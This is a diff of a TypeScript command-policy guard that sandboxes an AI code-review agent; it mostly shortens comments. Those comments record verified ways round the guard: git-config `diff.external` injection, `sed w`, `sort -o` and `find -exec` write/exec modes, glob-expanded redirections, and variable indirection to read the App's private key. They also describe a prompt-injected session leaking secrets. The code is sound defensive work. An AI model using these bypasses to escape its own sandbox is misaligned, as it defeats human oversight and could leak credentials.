-  // name a replacement. Deliberately AFTER the check above, not before it: the
-  // first cut had it first, which meant `awk`'s removal from ALLOWED was
-  // unobservable (putting awk back left the suite green, because this branch
-  // blocked it anyway). A defence whose removal changes nothing is not a
-  // defence, and that inversion is the exact fault this ticket keeps finding.
+  // name a replacement. Deliberately AFTER the check above: were it first,
+  // removing `awk` from ALLOWED would be unobservable to the tests, and a
+  // defence whose removal changes nothing is not a defence.
   const interpreter = INTERPRETER_REASONS[base];
   if (interpreter !== undefined) return block(interpreter);
   return block(`exec policy: '${base}' is not an allowed read-only command`);
 }
 
-/** Quote/substitution-aware segment splitter. The first live day proved
- * quote-blind splitting unusable: `rg 'a|b'` shredded on the quoted pipe and
- * pattern fragments were vetted as programs. Rules:
+/** Quote/substitution-aware segment splitter (a quote-blind split shreds
+ * `rg 'a|b'` on the quoted pipe and vets pattern fragments as programs). Rules:
  *  - single quotes: everything inside is literal;
  *  - double quotes: separators are literal, but `$(` and backticks still
  *    execute, so they still split (quote state restored at the matching `)`);
  *  - backslash escapes the next char (outside single quotes);
  *  - unquoted `; & | && || newline ( )` split; `$(`/`)` track nesting so the
  *    command FOLLOWING a substitution lands in its own segment and is vetted
- *    (the old segment-merge was a bypass: `A="$(cat x)" python3 e.py`). */
+ *    (merging it back would let `A="$(cat x)" python3 e.py` through). */
 export function splitShellSegments(cmd: string): string[] {
   const segs: string[] = [];
   let cur = "";
@@ -1204,22 +1148,19 @@ function checkRootCredentialSpelling(text: string): BashCheck {
 }
 
 /**
- * The App-secret belt (MC-63) — and what it is NOT.
+ * The App-secret belt — and what it is NOT.
  *
- * showed by execution that `cat /opt/quickreview/secrets/app.pem` was
- * allowed: `cat` is a sanctioned reader, and the check above covered only the
- * OpenViking root-key spellings. A posted review body is a channel to GitHub,
- * so a prompt-injected session could publish the App's private key. The owner
- * ordered (2026-10-05) this cheap interim belt: refuse any session command, and
- * any read/write tool call, that NAMES one of the App's secret files or the
- * secrets dir itself.
+ * `cat` is a sanctioned reader, and a posted review body is a channel to
+ * GitHub, so without this a prompt-injected session could read
+ * `/opt/quickreview/secrets/app.pem` and publish the App's private key. This
+ * cheap interim belt refuses any session command, and any read/write tool
+ * call, that NAMES one of the App's secret files or the secrets dir itself.
  *
  * It is a SPELLING belt. Variable indirection (`d=/opt/quickreview/sec; cat
  * ${d}rets/app.pem`), a recursive read of an ancestor (`grep -r . /opt`), a
  * symlink, a file list fed to `xargs` — all of these still reach the files,
- * and no amount of pattern work here closes that class (this file's own
- * history says so four times over). The real fix is that a session
- * cannot read the dir at all: a uid or mount split,. Until then this
+ * and no amount of pattern work here closes that class. The real fix is that
+ * a session cannot read the dir at all: a uid or mount split. Until then this
  * turns the obvious spellings into a loud refusal.
  *
  * The sanctioned scripts keep working because they read the secrets as
@@ -1641,12 +1582,11 @@ export function judgeSecretPath(w: string, ctx: SecretPathContext): BashCheck {
 }
 
 /**
- * The file TOOLS' secret veto. pi's built-in `read` takes a `path`
- * and resolves `~` and a leading `@` itself (VERIFIED against pi 1.0.0's
+ * The file TOOLS' secret veto. pi's built-in `read` takes a `path` and
+ * resolves `~` and a leading `@` itself (VERIFIED against pi 1.0.0's
  * dist/core/tools/read.js schema and path-utils.js `resolveToCwd`), so the
  * judgement the bash belt applies to a word applies to that path — plus the
- * OpenViking root-credential spellings, which the read tool reached with no
- * check at all before this.
+ * OpenViking root-credential spellings.
  */
 export function checkReadPath(path: string, ctx?: SecretPathContext): BashCheck {
   const root = checkRootCredentialSpelling(path);
@@ -1660,12 +1600,10 @@ export function checkReadPath(path: string, ctx?: SecretPathContext): BashCheck 
  * Git's configuration and hook surface — the files that turn an ORDINARY git
  * command into arbitrary shell execution.
  *
- * This is the half of the exec boundary a command-string guard cannot reach.
- * Every bypass across's four rounds needed a suspicious token in the
- * command, but the decisive ingredient in each was A FILE THE SESSION WRITES —
- * and the guard never sees a write. Push it one step and the command becomes
- * innocent. VERIFIED executing on this host, with the config-scope pin
- * already in force:
+ * This is the half of the exec boundary a command-string guard cannot reach:
+ * once the decisive ingredient is A FILE THE SESSION WRITES, the command
+ * itself can be innocent. VERIFIED executing, with the config-scope pin in
+ * force:
  *
  *   printf '[diff]\n\texternal = <cmd>\n' >> <clone>/.git/config
  *   git diff <base> <head>            → ran <cmd>
@@ -1693,10 +1631,9 @@ export function checkReadPath(path: string, ctx?: SecretPathContext): BashCheck 
  * verdict file, the ledger, the review body and comment JSON — live under
  * `state/`, `verdict/` and `inject/`, none of which this touches.
  *
- * REACH, stated plainly, because two docstrings in this file have already
- * asserted a closedness they did not have. This binds the `write`/`edit` TOOL
- * path and shell REDIRECTION targets. It does NOT bind a write smuggled inside
- * a quoted program body (`awk 'BEGIN{print > "..."}'`) or through a sanctioned
+ * REACH, stated plainly: this binds the `write`/`edit` TOOL path and shell
+ * REDIRECTION targets. It does NOT bind a write smuggled inside a quoted
+ * program body (`awk 'BEGIN{print > "..."}'`) or through a sanctioned
  * script. Those remain the bash program allowlist's job, and the allowlist is
  * what keeps the set of programs that can write a file at all small.
  */
@@ -1807,21 +1744,21 @@ export function isPolicySurface(path: string): boolean {
 }
 
 /**
- * The MEMORY-SCOPE files (S8b) — what decides how far a PR session's
- * OWN memory recall may reach. The daemon publishes both into the session's
- * pi home, beside its `ovcli.conf` (src/memory/ovsession.ts), and the vendored
+ * The MEMORY-SCOPE files — what decides how far a PR session's OWN memory
+ * recall may reach. The daemon publishes both into the session's pi home,
+ * beside its `ovcli.conf` (src/memory/ovsession.ts), and the vendored
  * OpenViking extension reads them on every prompt:
  *
- *   · `recall-hints/<session>.json` — the RECALL HINT (S5,
- *     `ovRecallHintPathIn`): the round's query and the memory AREAS the
- *     session's recall and its memory tools may reach (`experiences/` alone —
- *     vendored patches 0008/0009/0011). One write of
- *     `{"areas":["finding-cases","events"]}` widens the session's own scope to
- *     the finding cases and the feedback events no round may read (S9), until
- *     the daemon writes the hint again at the next round.
- *   · `retired-uris.json` — the RETIRED list (S3, `ovRetiredPathIn`)
- *     the recall excludes. Emptied, it brings retired entries back into every
- *     prompt's recall.
+ *   · `recall-hints/<session>.json` — the RECALL HINT (`ovRecallHintPathIn`):
+ *     the round's query and the memory AREAS the session's recall and its
+ *     memory tools may reach (`experiences/` alone — vendored patches
+ *     0008/0009/0011). One write of `{"areas":["finding-cases","events"]}`
+ *     would widen the session's own scope to the finding cases and the
+ *     feedback events no round may read, until the daemon writes the hint
+ *     again at the next round.
+ *   · `retired-uris.json` — the RETIRED list (`ovRetiredPathIn`) the recall
+ *     excludes. Emptied, it brings retired entries back into every prompt's
+ *     recall.
  *
  * A review session READS memory and never writes either file; the daemon does,
  * whole and atomically, every round. Matched as a SHAPE like the policy
@@ -1847,10 +1784,10 @@ export function isMemoryScopeSurface(path: string): boolean {
 }
 
 /** The full set a session may not write, from ONE definition: git's own config
- * and hook surface, this system's policy surface and the
- * memory-scope files its own recall reads (S8b). Both the write/edit
- * tool veto (`checkWritePath`) and the shell-redirection / sed scan
- * (`checkProtectedWrites`) refuse exactly this, so they cannot drift. */
+ * and hook surface, this system's policy surface and the memory-scope files
+ * its own recall reads. Both the write/edit tool veto (`checkWritePath`) and
+ * the shell-redirection / sed scan (`checkProtectedWrites`) refuse exactly
+ * this, so they cannot drift. */
 export function isProtectedWriteTarget(path: string): boolean {
   return isGitConfigSurface(path) || isPolicySurface(path) || isMemoryScopeSurface(path);
 }
@@ -1884,19 +1821,19 @@ function gitConfigWriteBlock(path: string): BashCheck {
 }
 
 /**
- * A redirection target is EXPANDED by bash before the file is opened
- * (S8b review): pathname expansion (`*`, `?`, `[…]`) turns a pattern
- * matching one existing file into that file, and a sequence brace with one
- * element (`{s..s}`) is one word — `> recall-hint?/pr-1.json`,
- * `> retired-uri[s].json`, `> retired-uris.js*` and `> recall-hint{s..s}/…`
- * each overwrote the real file (VERIFIED on this host), while the literal
- * name check saw none of them. So a target carrying either syntax is judged
- * by every protected NAME it could expand onto: each brace group is widened
- * to `*`, each pattern component is replaced by each protected component
- * name it matches (`globToRegex`), and every resulting path is put to the
- * same `isProtectedWriteTarget` — for all three sets, git's config surface
- * (`.gi?/config`) and the policy surface (`config.tom?`) included. A pattern
- * no protected name can satisfy (`> /tmp/out-*.txt`) is left alone.
+ * A redirection target is EXPANDED by bash before the file is opened:
+ * pathname expansion (`*`, `?`, `[…]`) turns a pattern matching one existing
+ * file into that file, and a sequence brace with one element (`{s..s}`) is one
+ * word — `> recall-hint?/pr-1.json`, `> retired-uri[s].json`,
+ * `> retired-uris.js*` and `> recall-hint{s..s}/…` each overwrite the real
+ * file (VERIFIED), while a literal name check sees none of them. So a target
+ * carrying either syntax is judged by every protected NAME it could expand
+ * onto: each brace group is widened to `*`, each pattern component is replaced
+ * by each protected component name it matches (`globToRegex`), and every
+ * resulting path is put to the same `isProtectedWriteTarget` — for all three
+ * sets, git's config surface (`.gi?/config`) and the policy surface
+ * (`config.tom?`) included. A pattern no protected name can satisfy
+ * (`> /tmp/out-*.txt`) is left alone.
  */
 const BRACE_GROUP_RE = /\{[^{}]*(?:,|\.\.)[^{}]*\}/g;
 /** The component names the protected sets are spelled with: what a pattern
@@ -1964,8 +1901,7 @@ const REDIRECT_OP_ATTACHED_RE = /^\d*>>?(.+)$/;
 
 /** A shell word with its quoting removed. bash opens `con"fig".toml`,
  * `config\.toml` and `config.toml` as the SAME file, so a write target is
- * judged by the name bash would open, not by its spelling — the first two
- * walked past the git-config veto too (VERIFIED writing). */
+ * judged by the name bash would open, not by its spelling (VERIFIED writing). */
 function dequote(word: string): string {
   return word.replace(/["'\\]/g, "");
 }
@@ -1981,9 +1917,8 @@ function dequote(word: string): string {
  *   · `{v}>file` opens the file on a descriptor bash picks and stores in `v`;
  *   · `<>file` opens read-write — `printf x 1<>config.toml` OVERWRITES it;
  *   · `>|file` overrides noclobber.
- * All five VERIFIED writing the target on this host. The prior scan knew `>`
- * and `>>` only, so each was a bypass of the git-config veto as well
- * (found while closing the policy surface).
+ * All five VERIFIED writing the target; a scan that knew only `>` and `>>`
+ * would miss each.
  */
 export function normalizeRedirections(cmd: string): string {
   return cmd
@@ -1997,9 +1932,9 @@ export function normalizeRedirections(cmd: string): string {
 
 /**
  * Shell redirections and `sed -i` whose target is a PROTECTED write surface —
- * git's config/hook surface OR this system's own policy surface
- *: config.toml, scripts/, dist/, extensions/, prompts/agents/seeds
- * OR the memory-scope files a session's recall reads (S8b).
+ * git's config/hook surface, this system's own policy surface (config.toml,
+ * scripts/, dist/, extensions/, prompts/agents/seeds, .pi/, the pi context
+ * files) or the memory-scope files a session's recall reads.
  *
  * The segment splitter deliberately skips redirection remnants when hunting for
  * the program token, so `cat evil > config.toml` and `printf '…' > .git/config`
@@ -2041,8 +1976,7 @@ export function checkProtectedWrites(cmd: string): BashCheck {
     const t = tokens[i]!;
     // `> path`, `>> path` — target is the next token. Tested BEFORE the
     // attached form, which would otherwise swallow a bare `>>` by reading its
-    // second `>` as the target (a real bug this ordering fixes, caught by the
-    // `printf … >> .git/config` case and not by `> .git/config`).
+    // second `>` as the target.
     if (REDIRECT_OP_RE.test(t)) {
       const target = tokens[i + 1];
       if (target !== undefined && isProtectedWriteTarget(dequote(target)))
@@ -2060,8 +1994,8 @@ export function checkProtectedWrites(cmd: string): BashCheck {
   }
   // The whitespace scan above is quote-blind on purpose (over-broad: a quoted
   // `> config.toml` inside a pattern is refused too) and therefore cannot see
-  // two things bash does (S8b review): an operator GLUED to the word
-  // before it (`printf x>retired-uris.json` — `x>` is no token it knows), and
+  // two things bash does: an operator GLUED to the word before it
+  // (`printf x>retired-uris.json` — `x>` is no token it knows), and
   // a target bash EXPANDS (`> retired-uri[s].json`). Both are judged here,
   // over the redirections bash would actually perform — `redirectTargets`
   // reads quotes, so a `>` inside a quoted grep pattern is no write and its
@@ -2144,9 +2078,9 @@ export function checkBashCommand(cmd: string, depth = 0): BashCheck {
   // legitimately allowed, so the path is the only thing that distinguishes it.
   const secret = checkSecretPaths(normalized);
   if (!secret.allowed) return secret;
-  // Same shape, same reason: a PROTECTED write surface — git's config surface
-  // and this system's own policy surface. A redirection
-  // target is not a program token, so the per-segment walk below never sees it.
+  // Same shape, same reason: a PROTECTED write surface
+  // (`isProtectedWriteTarget`). A redirection target is not a program token,
+  // so the per-segment walk below never sees it.
   const protectedWrite = checkProtectedWrites(normalized);
   if (!protectedWrite.allowed) return protectedWrite;
   for (const segment of splitShellSegments(normalized)) {
@@ -2162,38 +2096,30 @@ export function checkBashCommand(cmd: string, depth = 0): BashCheck {
 }
 
 /**
- * The read-only programs that are not read-only (round 2).
+ * The read-only programs that are not read-only.
  *
- * `sed`, `sort` and `find` are on ALLOWED (`awk` was too, until round
- * 3 took it off — see the note at the end of this table) because a reviewer
- * greps and slices text all day. Each also has a mode that WRITES A FILE or
- * RUNS A COMMAND, and a review session needs none of them. Until this existed,
- * all of these were permitted and all are VERIFIED on this host:
+ * `sed`, `sort` and `find` are on ALLOWED because a reviewer greps and slices
+ * text all day. Each also has a mode that WRITES A FILE or RUNS A COMMAND, and
+ * a review session needs none of them. Without these rules, each of these
+ * works (all VERIFIED):
  *
  *   sed -n 'w .git/config' payload            → wrote it; plain `git diff` then ran <cmd>
  *   sort -o .git/config payload               → same
  *   find . -maxdepth 0 -fprintf .git/config … → same
- *   awk 'BEGIN{print x >>".git/config"}'      → same
- *   awk 'BEGIN{system("<cmd>")}'              → ran <cmd> DIRECTLY, no config involved
- *   awk 'BEGIN{"<cmd>" | getline}'            → ran <cmd> directly
- *   find . -maxdepth 0 -exec <cmd> \;         → ran <cmd> directly
+ *   find . -maxdepth 0 -exec <cmd> \;         → ran <cmd> DIRECTLY, no config involved
  *
- * The last three are worth separating out: they are not git-config bypasses at
- * all. They are arbitrary execution straight through the program allowlist,
- * which makes the no-exec policy's central claim false on its own terms. The
- * exec-mode half of this rule is therefore not a hardening of's write
- * story; it closes a hole that was always there.
+ * The last is not a git-config bypass at all but arbitrary execution straight
+ * through the program allowlist, so the exec-mode half of this rule is as
+ * load-bearing as the write half.
  *
- * This is the NARROW form of "reduce what the boundary must permit" — gating
- * four programs' write/exec modes, not redesigning how sessions get context.
  * A blocked mode is a loud refusal on something a reviewer never legitimately
  * does; the failure modes are not symmetric.
  *
  * What it is NOT: the defence against the write class. A command-string rule
- * cannot see `T=.git/config; cat p >> $T`, and adding spellings here would be
- * the same mistake made four times. The class is closed by the
- * round-boundary config-integrity check (`src/execboundary.ts`), which needs no
- * enumeration at all. This narrows the surface; that catches what gets through.
+ * cannot see `T=.git/config; cat p >> $T`, and adding spellings here does not
+ * close it. The class is closed by the round-boundary config-integrity check
+ * (`src/execboundary.ts`), which needs no enumeration at all. This narrows the
+ * surface; that catches what gets through.
  */
 interface ReaderModeRule {
   /** Flags that write or execute, matched whole or as `--flag=value`. */
@@ -2212,9 +2138,8 @@ const READER_MODE_RULES: Readonly<Record<string, ReaderModeRule>> = {
     what: "runs a command or writes a file",
   },
   // -o/--output writes; --compress-program names a program sort execs when it
-  // spills to temp files (NOT reproduced here — sort did not spill on a small
-  // input — so it is refused on documented behaviour, not on a probe; said
-  // plainly so nobody later cites this line as evidence it was demonstrated).
+  // spills to temp files (refused on documented behaviour, not on a probe —
+  // sort does not spill on a small input).
   // `o` is unambiguous in sort's short-option set, so a cluster carrying it is
   // an output redirect.
   sort: {
@@ -2237,10 +2162,9 @@ const READER_MODE_RULES: Readonly<Record<string, ReaderModeRule>> = {
     ],
     what: "writes a file or runs a command",
   },
-  // NOTE — there is no `awk` entry any more, and adding one back would be a
-  // mistake. Four rules lived here and all four were defeated by a bare
-  // identifier (`print "cmd" | c`), because awk's exec and write forms take
-  // arbitrary EXPRESSIONS. awk is off ALLOWED instead; see the comment there.
+  // There is deliberately no `awk` entry: awk's exec and write forms take
+  // arbitrary EXPRESSIONS (`print "cmd" | c`), so no rule here can gate it.
+  // awk is off ALLOWED instead; see the comment there.
 };
 
 /**
@@ -2263,15 +2187,12 @@ export function checkReaderModes(
     }
   }
   // The body rules run over the args JOINED **with their quotes intact**, and
-  // over each argument on its own. Two separate mistakes made that necessary:
+  // over each argument on its own, because:
   //   · the splitter tokenises on whitespace, so a quoted program is already
-  //     shredded here — `awk 'BEGIN { print x > "f" }'` arrives as five tokens
-  //     and no per-token rule can see `print … >` as one thing (the reviewer's
-  //     probe recorded exactly this: the no-space form passed while the spaced
-  //     form blocked *by accident* on the redirection scan);
+  //     shredded here — `sed -n '1 w f'` arrives as four tokens and no
+  //     per-token rule can see the command as one thing;
   //   · `checkProgram` strips a leading/trailing quote from every token, which
-  //     turns `BEGIN{"id" | getline}` into `BEGIN{"id | getline}` and destroys
-  //     the very quoting the rules key on. Hence `rawArgs`.
+  //     destroys the very quoting the rules key on. Hence `rawArgs`.
   //
   // The third form is a script GLUED TO ITS FLAG. `sed -e 'w f'` is caught
   // because `w` arrives as its own token, but `sed --expression='w f'` and
@@ -2295,15 +2216,15 @@ export function checkReaderModes(
 }
 
 /**
- * The write/edit tools' policy check. The write half of the
- * two boundaries `isProtectedWriteTarget` binds — the other is the shell
- * redirection / `sed -i` scan in `checkProtectedWrites`, and both read the same
- * predicate so a session cannot write through one what it is refused through the
- * other. Refuses git's config/hook surface, this system's own policy surface
- * (config.toml, scripts/, dist/, extensions/, prompts/agents/seeds) and the
- * memory-scope files its recall reads (the recall hint, the retired list —
- * S8b); everything else a session writes — the verdict file, the
- * ledger, /tmp bodies — is allowed. This is not a write allowlist.
+ * The write/edit tools' policy check. The write half of the two boundaries
+ * `isProtectedWriteTarget` binds — the other is the shell redirection /
+ * `sed -i` scan in `checkProtectedWrites`, and both read the same predicate so
+ * a session cannot write through one what it is refused through the other.
+ * Refuses git's config/hook surface, this system's own policy surface
+ * (config.toml, scripts/, dist/, extensions/, prompts/agents/seeds, .pi/, the
+ * pi context files) and the memory-scope files its recall reads (the recall
+ * hint, the retired list); everything else a session writes — the verdict file,
+ * the ledger, /tmp bodies — is allowed. This is not a write allowlist.
  */
 export function checkWritePath(path: string): BashCheck {
   return isProtectedWriteTarget(path) ? protectedWriteBlock(path) : { allowed: true };
@@ -2331,7 +2252,7 @@ const WRITE_TOOLS = new Set([
 const READ_TOOLS = new Set(["read", "grep", "find", "ls", "read_file", "view", "cat"]);
 
 /**
- * pi activation. VERIFIED (findings §5 lines 132-141): a tool_call
+ * pi activation. VERIFIED (pi control-surface findings §5): a tool_call
  * handler can return { block: true, reason } to veto the call, and event.input
  * is mutable. pi 1.0.0 emits `{ type: "tool_call", toolName, toolCallId,
  * input }` (dist/core/agent-session.js) and its read/grep/find/ls tools take
